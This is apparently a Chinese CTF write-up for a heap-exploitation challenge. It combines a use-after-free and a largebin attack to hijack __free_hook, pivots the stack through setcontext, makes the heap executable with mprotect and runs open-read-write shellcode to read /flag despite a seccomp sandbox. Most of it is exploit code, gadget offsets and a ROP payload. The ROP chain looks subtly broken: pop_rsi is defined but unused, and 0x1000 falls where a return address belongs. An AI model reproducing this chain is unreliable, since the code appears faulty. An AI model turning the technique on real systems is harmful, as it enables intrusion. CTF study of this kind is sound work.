# note_context

## 题目简述

题目延续 `large_note` 的 UAF 与 largebin attack，但加入沙箱，直接执行 `system("/bin/sh")` 不再可行。需要通过相同的 `mp_.tcache_bins` 攻击控制 `__free_hook`，再使用 `setcontext+61` 完成栈迁移，调用 `mprotect` 把堆改成可执行，最后运行 ORW shellcode 读取 `/flag`。

## 解题过程

前半段与 `large_note` 相同：

1. 申请 `0x528`、`0x600`、`0x518`、`0x600` 四个大块；
2. 利用 UAF 和单字节覆盖泄露 libc，偏移为 `0x1E3C61`；
3. 泄露堆地址并减去 `0x290`；
4. largebin attack 修改 `mp_.tcache_bins`；
5. 让越界的 `0x600` tcache entry 指向 `__free_hook`。

计算后续地址：

```python
free_hook = libc_base + libc.sym["__free_hook"]
setcontext = libc_base + libc.sym["setcontext"] + 61
mprotect = libc_base + libc.sym["mprotect"]

gadget = libc_base + 0x14B760
pop_rdi = libc_base + 0x2858F
pop_rsi = libc_base + 0x2AC3F
pop_rdx_rbx = libc_base + 0x1597D6
```

其中 `gadget` 的作用是从传给 `free` 的 chunk 中取出伪造上下文指针，再进入 `setcontext` 恢复寄存器。先把 `__free_hook` 写成该 gadget：

```python
add_note(1, 0x600)
edit_note(1, p64(gadget))
```

沙箱允许 `open`、`read`、`write`，因此构造 ORW shellcode：

```python
from pwn import asm, shellcraft

shellcode = asm(shellcraft.open("/flag"))
shellcode += asm(shellcraft.read(3, heap_base, 0x50))
shellcode += asm(shellcraft.write(1, heap_base, 0x50))
```

在 chunk 0 中布置伪上下文和 ROP 链。ROP 先调用 `mprotect(heap_base, 0x1000, 7)`，再跳到堆上的 shellcode：

```python
payload = p64(0)
payload += p64(heap_base + 0x2A0)
payload += p64(0)
payload += p64(0)
payload += p64(setcontext)

payload = payload.ljust(0xA0, b"\x00")
payload += p64(heap_base + 0x2A0 + 0xB0)
payload += p64(pop_rdi)
payload += p64(heap_base)
payload += p64(0x1000)
payload += p64(pop_rdx_rbx)
payload += p64(7)
payload += p64(0)
payload += p64(mprotect)
payload += p64(heap_base + 0x3A0)

payload = payload.ljust(0x100, b"\x00")
payload += shellcode
edit_note(0, payload)
delete_note(0)
io.interactive()
```

释放 chunk 0 时触发 `__free_hook`，伪上下文把栈切换到堆上的 ROP 链；堆页取得执行权限后进入 shellcode，最终把 `/flag` 内容写到标准输出。

## 方法总结

存在 seccomp 时，拿到任意调用或 hook 覆盖并不等于可以直接起 shell。应先确认允许的系统调用，再选择 ORW。`setcontext` 的价值在于一次恢复多组寄存器和栈指针，适合把受限的函数指针劫持扩展成完整 ROP；所有 gadget 和结构偏移都必须与题目 libc 精确匹配。
